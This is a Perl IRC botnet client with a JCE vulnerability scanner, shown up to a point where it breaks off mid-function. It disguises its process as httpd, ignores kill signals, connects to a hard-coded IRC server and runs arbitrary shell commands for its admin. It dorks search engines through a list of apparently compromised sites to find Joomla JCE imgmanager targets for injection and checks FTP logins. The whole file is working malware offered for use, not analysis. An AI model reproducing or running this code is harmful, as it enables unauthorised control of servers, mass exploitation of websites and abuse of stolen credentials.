#!/usr/bin/perl

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use Socket;
use MIME::Base64;
use File::Basename;
use URI::Escape; 
use Digest::MD5 qw(md5_hex); 

my $datetime    = localtime;
my $fakeproc  	= "/usr/sbin/httpd";
my $number = int(rand(10));
my $ircserver   = "irc.totabuan.id";
my $ircport     = "6667";
my $nickname  	= "Jcx".int(rand(100))."";
my $ident       = "jcx";
my $channel     = "#thefreakynight";
my $base        = "#netirc";
my $admin    	= "Blackz";
my $fullname    = "new JCE scanner";
my $rawmsg      = $ARGV[4];
my $msgraw      = $ARGV[5];

my $nob0dy	   = "8,1 * 7[15FT7]8,1 * ";
my $jcelogo = "11,1 [-JCE-] 15";




my $jcecmd	  = "!j";
my $ftpcmd	  = "!ftp";

my $spreadMode	= 1;
my $gps		= 1;
my $gps2	= 1;
my $timot	= 10;
my $silentmode	= 1;
my $zerowget	= 1;
my $zerolwp	= 1;
my $zerocurl	= 1;
my $jceid = "https://capadesu.space/insomnia/index_backup.php";
my $uagent             = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6";
my @randombarner= ("http://www.rateavon.je/error.php","http://imotionasia.com.vn/errors.php","https://automarket-fortuna.ru/errors.php","http://recbf.free.fr/rec09Joomla//images/banners/error.php","http://ekodom.od.ua/images/stories/errors.php","http://weenraeh.com/mobile/catalog/images/errors.php","http://www.ratacibernetica.com//images/stories/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://viewwebinars.com/wp-includes/errors.php","http://www.asmecbrasil.org.br/images/stories/error/error.php","http://zoetrash.de/error/error.php","http://www.boloderolopernambucano.com.br/images/stories/class-mail.php","http://www.accidentresolution.com/blogspot/images/stories/error/error.php","http://www.negocioselectronicos.biz/images/stories/error/error.php","http://inter-projekt.waw.pl/images/stories/error//error.php","http://zoetrash.de/error/error.php","http://158.108.207.2/ae/error/error.php","http://www.infiltrometrie-thermographie.biz/images/stories/search.php","http://www.linuxcompany.nl/modules/mod_login/error.php","http://www.kuzmice.eu/templates/error.php","http://www.escolafutboltarr.com/images/stories/error.php","http://www.fabriek.nl/content/images/stories/error.php","http://www.gingerteastudio.com//wp-content/uploads/components/search.php","http://www.tenerifeluxuryrentalvilla.co.uk/error.php","http://michelleny2.sytes.net/templates/Dreams/error.php","http://vkvrbatky.cz/libraries/openid/error.php","http://ronde-en-couleurs.com/wp-includes/error.php","http://www.rateavon.je/error.php","http://imotionasia.com.vn/errors.php","https://automarket-fortuna.ru/errors.php","http://recbf.free.fr/rec09Joomla//images/banners/error.php","http://ekodom.od.ua/images/stories/errors.php","http://www.fabriek.nl/content/images/stories/error.php","http://liftoffconsulting.ca/wp-includes/errors.php","http://www.rateavon.je/error.php","http://imotionasia.com.vn/errors.php","https://automarket-fortuna.ru/errors.php","http://recbf.free.fr/rec09Joomla//images/banners/error.php","http://ekodom.od.ua/images/stories/errors.php","http://www.pmi.org.sg//components/com_jnews/includes/openflashchart/tmp-upload-images/components/search.php");
my $fullmagic  	= $randombarner[rand(scalar(@randombarner))];
my $xbarner2	= "https://capadesu.space/insomnia/index_backup.php";
my $jack	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
my $mac	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=";
my $apple	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $orange	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $jackae	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
my $jackar	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=";
my $jackau	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $jackat	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $jackbr	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.za%2Fsearch?q=";
my $jackca	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
my $jackcl	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=";
my $jackcn	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $jackcom	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $jackcz	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.za%2Fsearch?q=";
my $jackde	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
my $jackdk	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=";
my $jackes	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $jackeu	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $jackfr	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.za%2Fsearch?q=";
my $jackhu	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
my $jackid	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=";
my $jackil	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $jackin	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $jackinfo	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.za%2Fsearch?q=";
my $jackit	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
my $jackjp	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=";
my $jackkr	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $jackmx	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $jackph	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.za%2Fsearch?q=";
my $jackmy	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
my $jacknet	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=";
my $jacknl	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $jackorg	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $jackpl	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
my $jackro	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=";
my $jackru	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $jackth	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $jackua	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.za%2Fsearch?q=";
my $jackuk	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com%2Fsearch?q=";
my $jackus	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.co.id%2Fsearch?q=";
my $jacksi	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $jackbe	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $jackbiz	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.hk%2Fsearch?q=";
my $jack40	= "".$fullmagic."?____pgfa=https%3A%2F%2Fwww.google.com.br%2Fsearch?q=";
my $engine              = "Google,Google2,Walla,Yahoo,Ask,Bing,Onet,Clusty,Sapo,Aol,Uol,Lycos,Hotbot,Biglobe,Quint,Seznam,Kvasir,Bypass,JacKAC,JacKAD,JacKAE,JacKAF,JacKAG,JacKAL,JacKAM,JacKAN,JacKAT,JacKAR,JacKAU,JacKBE,JacKHU,JacKOrG,JacKCoM,JacKNeT,JacKPL,JacKIT,JacKID,JacKMY,
            JacKES,JacKUK,JacKUS,JacKJP,JacKKR,JacKDE,JacKDK,JacKCA,JacKBR,JacKRO,JacKRU,JacKNL,JacKInfO,JacKFR,JacKIN,JacKMX,JacKCZ,JacKCL,JacKUA,GooGLeCA,GooGLeDE,GooGLeUK,GooGLeFR,GooGLeES,GooGLeIT,GooGLeNL,GooGLeBE,GooGLeCH,GooGLeSE,GooGLeDK,GooGLeNO,GooGLeNZ,GooGLeIE,GooGLeBR,GooGLeAR,GooGLeCO,GooGLeCU,GooGLeCL,GooGLeMX,GooGLeAU,GooGLeRU,GooGLeAT,GooGLePL,GooGLeIL,GooGLeTR,GooGLeUA,GooGLeGR,GooGLeJP,GooGLeCN,GooGLeMY,GooGLeTH,GooGLeIN,GooGLeKR,GooGLeRO,GooGLeTW,GooGLeZA,GooGLePT,YahOoCA,YahOoUK,YahOoDE,YahOoFR,YahOoES,YahOoIT,YahOoHK,YahOoID,YahOoIN,YahOoAU,YahOoMX,YahOoTW,YahOoBR,YahOoAR,YahOoNL,YahOoDK,YahOoPH,YahOoCL,YahOoRU,YahOoCH,YahOoCO,YahOoFI,YahOoRO,YahOoVE,YahOoAT,YahOoPL,YahOoKR,YahOoNZ,YahOoGR,YahOoPE,BingDE,BingUK,BingCA,BingBR,BingFR,BingES,BingIT,BingBE,BingNL,BingPT,BingNO,BingDK,BingSE,BingCH,BingNZ,BingRU,BingJP,BingCN,BingKR,BingMX,BingAR,BingCL,BingAU,AsKCA,AsKDE,AsKIT,AsKFR,AsKES,AsKRU,AsKNL,AsKUK,AsKBR,AsKPL,AsKAU,AsKAT,AsKJP,AsKSE,AsKMX,AsKNO,AsKDK,aMidaLLa,DogPile,AnAnZi";

$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';
$ircserver = "$ARGV[0]" if $ARGV[0];
$ircport = "$ARGV[1]" if $ARGV[1];
$nickname = "$ARGV[2]" if $ARGV[2];
$channel = '#'."$ARGV[3]" if $ARGV[3];
$0 = "$fakeproc"."\0" x 16;
my $pid = fork;
exit if $pid;
die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep(1);}}

sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick($mynick.int(rand(5)));
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sleep(3);
        sendraw("ns identify bangsat");
        sendraw("AWAY   PRIVATE SCANNER Contact : Blackz");
        sendraw("JOIN $channel");
        sendraw("JOIN $base");
        sleep(1);
	sleep(1);
	sendraw("PRIVMSG $base : Jce Pv8 ");
        sendraw("PRIVMSG $admin :Hi $admin im here !!!");
    }
}

my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
    select(undef, undef, undef, 0.01);
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);

            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;
        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);			
            if ($path eq $mynick) {
				if ($msg =~ /^PING (.*)/) {
					sendraw("NOTICE $nick :PING $1");
				}
				if ($msg =~ /^VERSION/) {
					sendraw("NOTICE $nick :VERSION mIRC v6.21 Khaled Mardam-Bey");
				}
				if ($msg =~ /^TIME/) {
					sendraw("NOTICE $nick :TIME ".$datetime."");
				}
				if (&isAdmin($nick) && $msg eq "!die") {
					&shell("$path","kill -9 $$");
				}
				if (&isAdmin($nick) && $msg eq "!killall") {
					&shell("$path","killall -9 perl");
				}
				if (&isAdmin($nick) && $msg eq "!reset") {
					sendraw("QUIT :Restarting...");
				}
				if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
					sendraw("JOIN #".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
					sendraw("PART #".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
					sendraw("NICK ".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!pid/) {
					sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$");
				}
				if (&isAdmin($nick) && $msg !~ /^!/) {
					&shell("$nick","$msg");
				}
				if (&isAdmin($nick) && $msg =~ /^!raw (.+)/) {
					sendraw("$rawmsg $msgraw ".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!say (.+)/) {
					sendraw("PRIVMSG $rawmsg ".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^!act (.+)/) {
					sendraw("PRIVMSG $rawmsg :ACTION ".$1."");
				}
				if (&isAdmin($nick) && $msg =~ /^!changetimthumb\s+(.*) -d/) {
					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
					$newthumbcmd = $1;
					$thumbcmd = $newthumbcmd;
					&msg("$admin","$thumblogo Scan Command change to $thumbcmd ");
				}}}
			}
			else {
				if (&isAdmin($nick) && $msg eq "!die") {
					&shell("$path","kill -9 $$");
				}
				if (&isAdmin($nick) && $msg eq "!killall") {
					&shell("$path","killall -9 perl");
				}
				if (&isAdmin($nick) && $msg eq "!reset") {
					sendraw("QUIT :Restarting...");
				}
				if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
					sendraw("JOIN #".$1);
				}
				if (&isAdmin($nick) && $msg eq "!part") {
					sendraw("PART $path");
				}
				if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
					sendraw("PART #".$1);
				}
				if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
					&shell("$path","$1");
				}
				if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
					&shell("$path","$1");
				}
				if ($msg=~ /^!diam\s+(.*) -d/) {
					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
					$smod = $1;
				if ($smod =~ /ON/) { $silentmode = 1; $silentstat = "ON"; }
				elsif ($smod =~ /OFF/) { $silentmode = 0; $silentstat = "OFF"; }
					&msg("$path","15(7@2SilentMode15) $silentstat !!!!");
				}}}
				if (&isAdmin($nick) && $msg =~ /^!changeinjector\s+(.*) -d/) {
					$newhostinjector= $1;
					$hostinjector = $newhostinjector;
					&msg("$path","15(7@2Injector15)4 change to $hostinjector ");
				}
				if (&isAdmin($nick) && $msg =~ /^!spread\s+(.*) -d/) {
					$newhostbogel= $1;
					$hostbogel = $newhostbogel;
					&msg("$path","15(7@2Spreads15)4 change to $hostbogel ");
				}
				if ($msg=~ /^$cmdlfi\s+(.*?)\s+(.*)/){
					my $url = $1.$lfdtest;
					my $cmd = $2;
					&cmdlfi($url,$cmd,$path);
				}
                ########## Help / Commands Bot ##########

				if ($msg=~ /^!help/) {
					&msg("$path","15,1 9[HELP] 11JCE Vuln Scan:15 $jcecmd [dork] - 13PUB! ");
				}
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    &msg("$nick","6Fake Process/PID : $fakeproc - $$");
                }
				if ($msg=~ /^!id/ || $msg=~ /^!jceid/) {
                    if (&isFound($jceid,"GIF89")) {
                        &msg("$path","9,1 4Injector 11 Ready!!! ");
                    } else {
                        &msg("$path","9,1 4Injector 11 Lost!!! ");
                    }
                }
				if ($msg=~/^!bypass/){
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
					my $bystats1 = "";
					my $cekby1 = &get_content($jack."search");
					if ($cekby1 =~ /search/i){ $bystats1 = "9Up!!!"; } else { $bystats1 = "9Down!!!"; }
					&msg("$path","9,1 Bypass 8JacK=$bystats1 ")
				}}}

                ########## BArNEr FULLMAGIC Community ##########
            if ($msg =~ /^$jcecmd\s+(.*)/) {
 			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
 					my ($bug,$dork) = ("index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20",$1);
 							my $TOM = 'situs.txt';
							&msg("$path","15,1(7@11$nick15)8 please dont flood !!! ");
 							&msg("$path","$jcelogo 9Dork7 :4 $dork ");
 							&msg("$path","$jcelogo 3Search Engine Loading ...");
							&se_start($path,$bug,$TOM,$dork,$engine,9,$nick);
 							}
 						}
 					}
				if ($msg =~ /^$ftpcmd\s+(.+?)\s+(.*)\s+(.*)/) {
				my $url = $_[0];
				my $host = $_[1];
				my $user = $_[2];
				my $pass = $_[3];
					if (my $pid = fork) {
						waitpid($pid, 0);
					} else {
						if (fork) { exit; } else {
				my ($host,$user,$pass) = ($1,$2,$3);
					&msg("$path","15,1(15FTP15)4 Checking3 $host 7|3 $user 7:3 $pass ");
					my $success = 1;
					use Net::FTP;
					my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 5);
					$success = 0 if $ftp->login($user,$pass);
					$ftp->quit;
					if ($success == 0) {
						&notice("$nick"," 15,1(15FTP15)4 [ http://".$host." ] [".$user.":".$pass."] Success ");
						} else {
						&notice("$nick"," 15,1(15FTP15)4 [ http://".$host." ] [".$user.":".$pass."] Denied ");

					}
				}
			}
		}
	}
}
        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {

                parse("$line");
            } else {
                if ($#lines == 0) {
                    parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}

########## STOP EDITING HERE ##########

sub type() {
my ($chan,$bug,$TOM,$dork,$engine,$type,$nick) = @_;
	if ($type == 1){$type=&lfi_exploit($chan,$bug,$TOM,$dork,$engine,$nick);}
	elsif ($type == 9){$type=&jce_exploit($chan,$bug,$TOM,$dork,$engine,$nick);}
}

########## STOP EDITING HERE ##########

sub se_start() {
my ($chan,$bug,$TOM,$dork,$engine,$type,$nick) = @_;
my $scan_part = 1;
sendraw("MODE $chan +m");
	if ($scan_part == 1)
{
	if ($gps ==1) {
	if ($engine =~ /jackar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKAR",$type,$nick); } exit; } }
	if ($engine =~ /jackat/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKAT",$type,$nick); } exit; } }
	if ($engine =~ /jackau/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKAU",$type,$nick); } exit; } }
	if ($engine =~ /jackbr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKBR",$type,$nick); } exit; } }
	if ($engine =~ /jackca/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKCA",$type,$nick); } exit; } }
	if ($engine =~ /jackcl/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKCL",$type,$nick); } exit; } }
	if ($engine =~ /jackws/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKWS",$type,$nick); } exit; } }
	if ($engine =~ /jacktw/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKTW",$type,$nick); } exit; } }
	if ($engine =~ /jackbg/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKBG",$type,$nick); } exit; } }	
	if ($engine =~ /jackcn/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKCN",$type,$nick); } exit; } }
	if ($engine =~ /jackcom/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKCoM",$type,$nick); } exit; } }
	if ($engine =~ /jackcz/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKCZ",$type,$nick); } exit; } }
	if ($engine =~ /jackde/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKDE",$type,$nick); } exit; } }
	if ($engine =~ /jackdk/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKDK",$type,$nick); } exit; } }
	if ($engine =~ /jackes/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKES",$type,$nick); } exit; } }
	if ($engine =~ /jackco/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKCO",$type,$nick); } exit; } }	
	if ($engine =~ /jackeu/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKEU",$type,$nick); } exit; } }
	if ($engine =~ /jackfr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKFR",$type,$nick); } exit; } }
	if ($engine =~ /jackhu/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKHU",$type,$nick); } exit; } }
	if ($engine =~ /jackid/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKID",$type,$nick); } exit; } }
	if ($engine =~ /jackil/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKIL",$type,$nick); } exit; } }
	if ($engine =~ /jackin/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKIN",$type,$nick); } exit; } }
	if ($engine =~ /jackhr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKHR",$type,$nick); } exit; } }
	if ($engine =~ /jackfi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKFI",$type,$nick); } exit; } }
	if ($engine =~ /jackinfo/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKInfO",$type,$nick); } exit; } }
	if ($engine =~ /jackir/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKIR",$type,$nick); } exit; } }
	if ($engine =~ /jackit/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKIT",$type,$nick); } exit; } }
	if ($engine =~ /jackjp/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKJP",$type,$nick); } exit; } }
	if ($engine =~ /jackkr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKKR",$type,$nick); } exit; } }
	if ($engine =~ /jackmx/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKMX",$type,$nick); } exit; } }
	if ($engine =~ /jackmy/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKMY",$type,$nick); } exit; } }
	if ($engine =~ /jacknet/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKNeT",$type,$nick); } exit; } }
	if ($engine =~ /jacknl/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKNL",$type,$nick); } exit; } }
	if ($engine =~ /jackorg/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKOrG",$type,$nick); } exit; } }
	if ($engine =~ /jackph/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKPH",$type,$nick); } exit; } }
	if ($engine =~ /jackpl/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKPL",$type,$nick); } exit; } }
	if ($engine =~ /jackgr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKGR",$type,$nick); } exit; } }
	if ($engine =~ /jackro/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKRO",$type,$nick); } exit; } }
	if ($engine =~ /jackru/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKRU",$type,$nick); } exit; } }
	if ($engine =~ /jackth/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKTH",$type,$nick); } exit; } }
	if ($engine =~ /jackua/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKUA",$type,$nick); } exit; } }
	if ($engine =~ /jackuk/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKUK",$type,$nick); } exit; } }
	if ($engine =~ /jackus/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKUS",$type,$nick); } exit; } }
	if ($engine =~ /jackgr/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKGR",$type,$nick); } exit; } }
	if ($engine =~ /jackhk/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKHK",$type,$nick); } exit; } }	
	if ($engine =~ /jacksi/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKSI",$type,$nick); } exit; } }
	if ($engine =~ /jackbe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKBE",$type,$nick); } exit; } }
	if ($engine =~ /jackbiz/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKBIZ",$type,$nick); } exit; } }
	if ($engine =~ /jackza/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"JacKZA",$type,$nick); } exit; } }
